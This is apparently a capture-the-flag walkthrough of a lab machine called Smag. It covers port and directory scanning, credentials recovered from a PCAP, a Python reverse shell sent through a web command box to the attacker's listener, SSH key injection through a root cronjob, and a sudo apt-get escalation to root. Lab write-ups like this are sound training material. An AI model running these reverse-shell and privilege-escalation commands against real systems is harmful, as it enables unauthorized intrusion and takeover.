## Target IP: `10.10.98.180`

---

### Environment Setup

```bash
export IP=10.10.98.180
export LIP=10.6.24.56
```

---

### Reconnaissance

**Nmap Scan:**

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

**Nikto Scan:**

```bash
nikto -h http://$IP
```

**Gobuster Scan:**

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | SSH (OpenSSH 7.2p2) |
| 80 | HTTP (Apache 2.4.18) |

---

### Web Enumeration

Base page displayed:

```
Welcome to Smag!

This site is still heavily under development, check back soon to see some of the awesome services we offer!
```

Source code: nothing of value.

**Discovered Directory: `/mail`**

Browsing `/mail` revealed:

- Internal note about migrating from `192.168.33.0/24` to `10.10.0.0/8`
- Email thread referencing `dHJhY2Uy.pcap` (attached PCAP)
- Instructions to use `wget` to retrieve attachments due to software bug
- Hidden HTML comment:

```html
<!-- <a>Bcc: trodd@smag.thm</a> -->
```

**Usernames Identified:**

- jake
- uzi
- netadmin
- trodd

---

### PCAP Analysis

Downloaded `dHJhY2Uy.pcap` and opened with Wireshark. Found gold in a TCP stream:

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

username=helpdesk&password=[REDACTED]
```

Added `development.smag.thm` to `/etc/hosts`.

---

### Virtual Host Enumeration

Ran Gobuster on new vhost:

```bash
gobuster dir -u http://development.smag.thm -w /usr/share/wordlists/dirb/common.txt -x php
```

**Discovered Paths:**

- `/login.php`
- `/admin.php`

---

### Authenticated RCE

Logged into `/login.php` using creds from the PCAP:

```
Username: helpdesk
Password: [REDACTED]
```

Login page accepted input and included a command box. Simple commands like `whoami` or `ls` returned no output.

Ignored the silence and dropped a reverse shell:

**Payload:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.24.56",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Listener:**

```bash
nc -lvnp 7777
```

Shell landed.

---

### Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

User: `www-data`

---

### Privilege Escalation — SSH Key Injection via Cronjob

Checked crontab:

```bash
cat /etc/crontab
```

Output:

```
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

Means Jake’s `.ssh/authorized_keys` is overwritten every minute with the contents of `/opt/.backups/jake_id_rsa.pub.backup`.

Generated SSH keypair on local machine:

```bash
ssh-keygen -f jake
```

Copied contents of `jake.pub` into:

```bash
/opt/.backups/jake_id_rsa.pub.backup
```

Waited for cron to overwrite Jake’s authorized keys. Then:

```bash
ssh -i jake jake@$IP
```

And we’re in.

---

### Root Privileges

Checked sudo rights:

```bash
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Confirmed `apt-get` privilege escalation via GTFOBins:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Root shell.

---

### Final Flag

```bash
cat /root/root.txt
```

**Flag:**

```
[REDACTED]
```
